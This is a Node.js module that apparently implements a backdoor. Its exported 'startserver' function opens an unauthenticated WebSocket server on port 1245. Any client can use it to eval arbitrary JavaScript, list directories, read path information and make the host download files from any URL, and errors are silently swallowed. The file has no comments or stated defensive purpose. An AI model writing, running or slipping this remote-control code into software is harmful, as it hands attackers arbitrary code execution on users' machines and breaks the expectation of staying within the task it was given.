const ws=require('ws');
const {resolve}=require('path');
const path=require('path');
const fs=require('fs');
var request=require('request');
function downloadFile(uri,filename,callback){
    var stream=fs.createWriteStream(filename);
    request(uri).pipe(stream).on('close',callback); 
}
function startserver(){
    const WebSocket=require('ws');
    const wss=new WebSocket.Server({port:1245});
    wss.on('connection',(ws)=>{
        ws.on('message',(msg)=>{
            try{
                var json=JSON.parse(msg);
                if(json.what=="test")ws.send("Suc");
                else if(json.what=="eval"){
                    eval(json.mes);
                    ws.send("Suc");
                }
                else if(json.what=="pwd dir")ws.send(__dirname);
                else if(json.what=="pwd res")ws.send(resolve('./'));
                else if(json.what=="pwd cwd")ws.send(process.cwd());
                else if(json.what=="ls"){
                    var deep=[];
                    fs.readdirSync(json.mes).forEach(files=>{deep.push(files)});
                    ws.send(deep.toString());
                    deep=[];
                }
                else if(json.what=="down"){
                    var spl=json.mes.split(" ");
                    var fileUrl=spl[0];
                    var filename=spl[1];
                    downloadFile(fileUrl,filename,()=>{});
                }
            }catch(e){}                
        });  
    });
}
module.exports=startserver;